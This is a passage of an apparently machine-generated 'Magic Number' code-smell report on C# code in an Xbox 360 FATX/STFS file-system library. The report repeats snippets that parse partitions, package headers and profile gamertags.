(xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (idx == 0 || idx == 2) {  	if (xbase != 0xA)  		throw new Exception ();  }  else if (idx == 1) {  	if (xbase != 0xB)  		throw new Exception ();  }  else  	throw new Exception ();  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: while (pos != -1) {  	for (int i = 0; i < 0x40; i++) {  		if (pos == -1)  			break;  		io.Position = pos + 0x28 + (0x40 * i);  		byte nlen = (byte)(io.ReadByte () & 0x3F);  		if (nlen > 0x28)  			nlen = 0x28;  		io.Position = pos + (0x40 * i);  		if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  			io.Position = pos + (0x40 * i) + 0x2F;  			List<byte> buff = new List<byte> (io.ReadBytes (3));  			buff.Add (0);  			block = BitConv.ToUInt32 (buff.ToArray ()' false);  			pos = -1;  		}  	}  	if (pos != -1) {  		byte shift = xDesc.TopRecord.Index;  		if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		List<byte> xbuff = new List<byte> (io.ReadBytes (3));  		xbuff.Reverse ();  		xbuff.Insert (0' 3);  		block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  		if (block == Constants.STFSEnd)  			pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: while (pos != -1) {  	for (int i = 0; i < 0x40; i++) {  		if (pos == -1)  			break;  		io.Position = pos + 0x28 + (0x40 * i);  		byte nlen = (byte)(io.ReadByte () & 0x3F);  		if (nlen > 0x28)  			nlen = 0x28;  		io.Position = pos + (0x40 * i);  		if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  			io.Position = pos + (0x40 * i) + 0x2F;  			List<byte> buff = new List<byte> (io.ReadBytes (3));  			buff.Add (0);  			block = BitConv.ToUInt32 (buff.ToArray ()' false);  			pos = -1;  		}  	}  	if (pos != -1) {  		byte shift = xDesc.TopRecord.Index;  		if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		List<byte> xbuff = new List<byte> (io.ReadBytes (3));  		xbuff.Reverse ();  		xbuff.Insert (0' 3);  		block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  		if (block == Constants.STFSEnd)  			pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: while (pos != -1) {  	for (int i = 0; i < 0x40; i++) {  		if (pos == -1)  			break;  		io.Position = pos + 0x28 + (0x40 * i);  		byte nlen = (byte)(io.ReadByte () & 0x3F);  		if (nlen > 0x28)  			nlen = 0x28;  		io.Position = pos + (0x40 * i);  		if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  			io.Position = pos + (0x40 * i) + 0x2F;  			List<byte> buff = new List<byte> (io.ReadBytes (3));  			buff.Add (0);  			block = BitConv.ToUInt32 (buff.ToArray ()' false);  			pos = -1;  		}  	}  	if (pos != -1) {  		byte shift = xDesc.TopRecord.Index;  		if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		List<byte> xbuff = new List<byte> (io.ReadBytes (3));  		xbuff.Reverse ();  		xbuff.Insert (0' 3);  		block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  		if (block == Constants.STFSEnd)  			pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: while (pos != -1) {  	for (int i = 0; i < 0x40; i++) {  		if (pos == -1)  			break;  		io.Position = pos + 0x28 + (0x40 * i);  		byte nlen = (byte)(io.ReadByte () & 0x3F);  		if (nlen > 0x28)  			nlen = 0x28;  		io.Position = pos + (0x40 * i);  		if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  			io.Position = pos + (0x40 * i) + 0x2F;  			List<byte> buff = new List<byte> (io.ReadBytes (3));  			buff.Add (0);  			block = BitConv.ToUInt32 (buff.ToArray ()' false);  			pos = -1;  		}  	}  	if (pos != -1) {  		byte shift = xDesc.TopRecord.Index;  		if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		List<byte> xbuff = new List<byte> (io.ReadBytes (3));  		xbuff.Reverse ();  		xbuff.Insert (0' 3);  		block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  		if (block == Constants.STFSEnd)  			pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: while (pos != -1) {  	for (int i = 0; i < 0x40; i++) {  		if (pos == -1)  			break;  		io.Position = pos + 0x28 + (0x40 * i);  		byte nlen = (byte)(io.ReadByte () & 0x3F);  		if (nlen > 0x28)  			nlen = 0x28;  		io.Position = pos + (0x40 * i);  		if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  			io.Position = pos + (0x40 * i) + 0x2F;  			List<byte> buff = new List<byte> (io.ReadBytes (3));  			buff.Add (0);  			block = BitConv.ToUInt32 (buff.ToArray ()' false);  			pos = -1;  		}  	}  	if (pos != -1) {  		byte shift = xDesc.TopRecord.Index;  		if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			shift = (byte)((io.ReadByte () >> 6) & 1);  		}  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		List<byte> xbuff = new List<byte> (io.ReadBytes (3));  		xbuff.Reverse ();  		xbuff.Insert (0' 3);  		block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  		if (block == Constants.STFSEnd)  			pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: for (int i = 0; i < 0x40; i++) {  	if (pos == -1)  		break;  	io.Position = pos + 0x28 + (0x40 * i);  	byte nlen = (byte)(io.ReadByte () & 0x3F);  	if (nlen > 0x28)  		nlen = 0x28;  	io.Position = pos + (0x40 * i);  	if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  		io.Position = pos + (0x40 * i) + 0x2F;  		List<byte> buff = new List<byte> (io.ReadBytes (3));  		buff.Add (0);  		block = BitConv.ToUInt32 (buff.ToArray ()' false);  		pos = -1;  	}  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  	io.Position = pos + (0x40 * i) + 0x2F;  	List<byte> buff = new List<byte> (io.ReadBytes (3));  	buff.Add (0);  	block = BitConv.ToUInt32 (buff.ToArray ()' false);  	pos = -1;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (pos != -1) {  	byte shift = xDesc.TopRecord.Index;  	if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  	List<byte> xbuff = new List<byte> (io.ReadBytes (3));  	xbuff.Reverse ();  	xbuff.Insert (0' 3);  	block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  	if (block == Constants.STFSEnd)  		pos = -1;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (pos != -1) {  	byte shift = xDesc.TopRecord.Index;  	if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  	List<byte> xbuff = new List<byte> (io.ReadBytes (3));  	xbuff.Reverse ();  	xbuff.Insert (0' 3);  	block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  	if (block == Constants.STFSEnd)  		pos = -1;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (pos != -1) {  	byte shift = xDesc.TopRecord.Index;  	if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  	List<byte> xbuff = new List<byte> (io.ReadBytes (3));  	xbuff.Reverse ();  	xbuff.Insert (0' 3);  	block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  	if (block == Constants.STFSEnd)  		pos = -1;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (pos != -1) {  	byte shift = xDesc.TopRecord.Index;  	if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  		io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  		shift = (byte)((io.ReadByte () >> 6) & 1);  	}  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  	List<byte> xbuff = new List<byte> (io.ReadBytes (3));  	xbuff.Reverse ();  	xbuff.Insert (0' 3);  	block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  	if (block == Constants.STFSEnd)  		pos = -1;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  	shift = (byte)((io.ReadByte () >> 6) & 1);  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: shift = (byte)((io.ReadByte () >> 6) & 1);  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  	io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  	shift = (byte)((io.ReadByte () >> 6) & 1);  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: shift = (byte)((io.ReadByte () >> 6) & 1);  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: xbuff.Insert (0' 3);  
Magic Number,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXPartition,The following statement contains a magic number: xDrive.xIO.ReadBytes (4);  
Magic Number,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetNextBlock,The following statement contains a magic number: for (int i = (int)PartitionType; i < 4; i++)  	xList.Insert (0' 0);  
Magic Number,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The following statement contains a magic number: try {  	xIO.Position = 8;  	xIO.Position = (xIO.ReadUInt32 () * 0x200);  	if (xIO.ReadUInt32 () == (uint)AllMagic.FATX) {  		xType = DriveTypes.DevHardDrive;  		return true;  	}  }  catch {  }  
Magic Number,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The following statement contains a magic number: xIO.Position = 8;  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,xReadToFolder,The following statement contains a magic number: for (int i = 0; i < xcurpart.SubPartitions.Length; i++) {  	if (xcurpart.SubPartitions [i].PartitionName.ToLower () != Folders [1].ToLower ())  		continue;  	xcurpart = xcurpart.SubPartitions [i];  	idx++;  	if (Folders.Length == 2) {  		FATXReadContents xread = new FATXReadContents ();  		xread.xfiles = new List<FATXFileEntry> ();  		xread.xfolds = new List<FATXFolderEntry> ();  		foreach (FATXFolderEntry xz in xcurpart.Folders)  			xread.xfolds.Add (xz);  		return xread;  	}  	break;  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,xReadToFolder,The following statement contains a magic number: if (Folders.Length == 2) {  	FATXReadContents xread = new FATXReadContents ();  	xread.xfiles = new List<FATXFileEntry> ();  	xread.xfolds = new List<FATXFolderEntry> ();  	foreach (FATXFolderEntry xz in xcurpart.Folders)  		xread.xfolds.Add (xz);  	return xread;  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.HardDrive) {  	/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }                 x = new FATXPartition((long)HDD.Partition2' (long)HDD.Partition3 - (long)HDD.Partition2' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System");  	if (x.IsValid)  		xPartitions.Add (x);  	// Unknown  	x = new FATXPartition ((long)HDD.Partition4' (long)HDD.Partition5 - (long)HDD.Partition4' this' "Compatability");  	// Compatability  	if (x.IsValid)  		xPartitions.Add (x);  	// Compatability  	x = new FATXPartition ((long)HDD.Partition5' xIO.Length - (long)HDD.Partition5' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  	// Main Partition  }  else if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		